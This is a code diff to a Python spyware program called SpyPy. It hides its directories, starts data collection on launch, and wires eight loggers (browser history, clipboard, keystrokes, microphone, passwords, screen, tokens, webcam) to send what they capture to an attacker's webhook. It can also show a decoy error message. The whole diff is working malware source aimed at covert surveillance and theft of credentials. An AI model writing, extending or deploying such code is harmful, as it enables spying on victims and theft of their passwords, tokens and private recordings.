@@ -45,8 +45,10 @@ class SpyPy:
 
         if not os.path.exists(self.software_dir):
             os.makedirs(self.software_dir)
+            hide_dir(self.software_dir)
         if not os.path.exists(self.logs_path):
             os.makedirs(self.logs_path)
+            hide_dir(self.logs_path)
 
         self.is_exe = is_exe()
         self.first_run_flag = os.path.join(self.logs_path, f"{SOFTWARE_EXE_NAME}.flag")
@@ -68,17 +70,17 @@ class SpyPy:
                 ]
                 for logger_class_name in logger_class_names:
                     if globals().get(logger_class_name):
-                        self.loggers.append(globals()[logger_class_name]())
+                        self.loggers.append(globals()[logger_class_name](SOFTWARE_DIR_NAME, WEBHOOK_URL))
             else:
                 logger_classes = [
-                    BrowserLogger(),
-                    ClipboardLogger(),
-                    InputLogger(),
-                    MicrophoneLogger(),
-                    PasswordLogger(),
-                    ScreenLogger(),
-                    TokenLogger(),
-                    WebcamLogger(),
+                    BrowserLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
+                    ClipboardLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
+                    InputLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
+                    MicrophoneLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
+                    PasswordLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
+                    ScreenLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
+                    TokenLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
+                    WebcamLogger(SOFTWARE_DIR_NAME, WEBHOOK_URL),
                 ]
             for logger in logger_classes:
                 self.loggers.append(logger())
@@ -127,10 +129,12 @@ class SpyPy:
                     os._exit(1)
             else:
                 send_webhook(WEBHOOK_URL, f"{SOFTWARE_EXE_NAME} has been executed. Starting SpyPy...")
+                self.start()
         else:
             send_webhook(WEBHOOK_URL, f"SpyPy has been executed...")
             if CUSTOM_ERROR_MESSAGE:
                 display_error_message("Error", CUSTOM_ERROR_MESSAGE)
+            self.start()
 
 
 if __name__ == "__main__":
